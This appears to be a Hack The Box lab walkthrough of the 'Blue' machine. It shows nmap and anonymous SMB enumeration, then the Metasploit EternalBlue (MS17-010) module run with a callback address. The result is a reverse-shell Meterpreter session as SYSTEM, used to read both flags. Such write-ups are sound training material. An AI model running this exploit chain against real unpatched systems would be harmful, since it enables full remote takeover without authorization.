# Hack The Box — Blue

**Platform:** Hack The Box
**Machine Name:** Blue
**OS:** Windows
**Difficulty:** Easy
**IP Address:** `10.129.77.100`

---

## Overview

Today we are back with another **Hack The Box Windows-based machine**, named **Blue**.

Blue is a relatively straightforward machine that focuses heavily on **SMB enumeration and exploitation of the MS17-010 (EternalBlue) vulnerability**.

The attack path is simple:

```text
Port Enumeration
      ↓
SMB Enumeration
      ↓
Windows 7 Identification
      ↓
MS17-010 Detection
      ↓
EternalBlue Exploitation
      ↓
Meterpreter Session
      ↓
NT AUTHORITY\SYSTEM
      ↓
User Flag + Root Flag
```

---

## Table of Contents

* [Machine Information](#machine-information)
* [Reconnaissance](#reconnaissance)
* [Port Scanning](#port-scanning)
* [Service Enumeration](#service-enumeration)
* [SMB Enumeration](#smb-enumeration)
* [Identifying MS17-010](#identifying-ms17-010)
* [Exploitation](#exploitation)
* [Getting the Meterpreter Shell](#getting-the-meterpreter-shell)
* [Flag Enumeration](#flag-enumeration)
* [Attack Path Summary](#attack-path-summary)
* [Key Takeaways](#key-takeaways)
* [Tools Used](#tools-used)

---

# Machine Information

| Information | Details         |
| ----------- | --------------- |
| Machine     | Blue            |
| Platform    | Hack The Box    |
| OS          | Windows         |
| Difficulty  | Easy            |
| IP          | `10.129.77.100` |
| Hostname    | `HARIS-PC`      |
| Workgroup   | `WORKGROUP`     |

---

# Reconnaissance

We start by performing a basic Nmap scan against the target.

```bash
nmap 10.129.77.100
```

The initial scan identified several open ports:

```text
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

While the complete port scan was running in the background, we continued enumerating the services that were already identified.

---

# Port Scanning

Next, we performed a more detailed service/version scan.

```bash
nmap -sC -sV 10.129.77.100
```

The important results were:

```text
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
```

The scan also revealed:

```text
Host: HARIS-PC
OS: Windows 7 Professional 7601 Service Pack 1
Architecture: x64
Workgroup: WORKGROUP
```

The SMB security information was also interesting:

```text
Message signing enabled but not required
```

and:

```text
message_signing: disabled
```

The presence of **SMB on port 445** together with an older **Windows 7 SP1** system made SMB enumeration our next focus.

---

# Service Enumeration

The three primary services were:

### Port 135 — MSRPC

Microsoft RPC was exposed on port `135`.

### Port 139 — NetBIOS

NetBIOS session service was running on port `139`.

### Port 445 — SMB

SMB was exposed on port `445`.

Since SMB was publicly accessible from our attacking machine, we started with SMB enumeration.

---

# SMB Enumeration

We first enumerated the available SMB shares using anonymous access.

```bash
smbclient -L 10.129.77.100 -N
```

The target returned:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk
Users           Disk
```

We were also able to access the `Users` share without credentials:

```bash
smbclient \\\\10.129.77.100\\Users -N
```

This provided access to the SMB share:

```text
smb: \> ls
```

At this point, SMB was clearly an important attack surface.

---

# Identifying MS17-010

Because the target was running **Windows 7 Professional SP1** and had SMB exposed, we investigated whether the system was vulnerable to **MS17-010**, commonly associated with the **EternalBlue** exploit.

We used Metasploit to check the SMB service.

The relevant exploit was:

```text
windows/smb/ms17_010_eternalblue
```

After configuring the target and callback addresses:

```text
set LHOST 10.10.15.95
set RHOSTS 10.129.77.100
```

we executed:

```text
run
```

Metasploit performed the vulnerability check:

```text
[*] 10.129.77.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check

[+] 10.129.77.100:445
    Host is likely VULNERABLE to MS17-010!
    Windows 7 Professional 7601 SP1 x64 (64-bit)
```

The target was identified as **likely vulnerable to MS17-010**.

---

# Exploitation

With the vulnerability confirmed, we proceeded with the EternalBlue exploit.

Metasploit was configured with:

```text
set LHOST 10.10.15.95
set RHOSTS 10.129.77.100
```

We then launched the exploit:

```text
run
```

A reverse TCP handler was started on:

```text
10.10.15.95:4444
```

The exploit successfully resulted in a Meterpreter session.

---

# Getting the Meterpreter Shell

Once the Meterpreter session was established, we checked the current user:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\SYSTEM
```

This meant that the exploitation had already provided **SYSTEM-level privileges**.

No additional privilege escalation was required.

The attack path had therefore reached:

```text
SMB
 ↓
MS17-010
 ↓
EternalBlue
 ↓
Meterpreter
 ↓
NT AUTHORITY\SYSTEM
```

---

# Flag Enumeration

Since we had `NT AUTHORITY\SYSTEM` privileges, we could access the users' directories.

We first moved to:

```text
C:\Users\haris\Desktop
```

Listing the directory:

```text
Meterpreter 1)(C:\Users\haris\Desktop) > ls
```

showed:

```text
Mode              Size  Type  Name
----              ----  ----  ----
100666/rw-rw-rw-  282   fil   desktop.ini
100444/r--r--r--  34    fil   user.txt
```

The user flag was located at:

```text
C:\Users\haris\Desktop\user.txt
```

We could read it with:

```text
cat user.txt
```

---

## Root Flag

We then checked the Administrator desktop:

```text
C:\Users\Administrator\Desktop
```

Listing the directory showed:

```text
Mode              Size  Type  Name
----              ----  ----  ----
100666/rw-rw-rw-  282   fil   desktop.ini
100444/r--r--r--  34    fil   root.txt
```

The root flag was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

Since our Meterpreter session was already running as:

```text
NT AUTHORITY\SYSTEM
```

we had sufficient privileges to access it.

---

# Attack Path Summary

The complete attack chain was:

```text
             Target
                |
                v
        10.129.77.100
                |
                v
          Port Scanning
                |
                v
       SMB / TCP 445
                |
                v
        SMB Enumeration
                |
                v
       Windows 7 SP1
                |
                v
          MS17-010
                |
                v
        EternalBlue
                |
                v
       Meterpreter Shell
                |
                v
     NT AUTHORITY\SYSTEM
             /     \
            /       \
           v         v
      user.txt     root.txt
```

---

# Key Takeaways

* Always enumerate SMB when ports `139` and `445` are exposed.
* Anonymous SMB access can reveal useful information about a target.
* Identifying the target operating system and version can quickly point toward relevant vulnerabilities.
* **MS17-010/EternalBlue** is a critical example of the impact an unpatched SMB service can have.
* Always verify suspected vulnerabilities before attempting exploitation.
* Successful exploitation can sometimes provide direct administrative or SYSTEM-level access.
* After obtaining a privileged shell, enumerate common flag locations and accessible user directories.

---

# Tools Used

* Nmap
* smbclient
* Metasploit Framework
* Meterpreter

---

# Final Notes

Blue is a classic Hack The Box machine that demonstrates how dangerous an exposed and vulnerable SMB service can be.

The machine provides a straightforward progression from:

```text
Enumeration → SMB → MS17-010 → EternalBlue → SYSTEM
```

It is a good machine for understanding the importance of **service enumeration, vulnerability identification, SMB security, and exploitation of unpatched Windows systems**.

---

## Disclaimer

This writeup is intended for **educational purposes and authorized security testing only**.

All testing described here was performed against a Hack The Box machine in an authorized lab environment. Do not attempt these techniques against systems you do not own or have explicit permission to test.
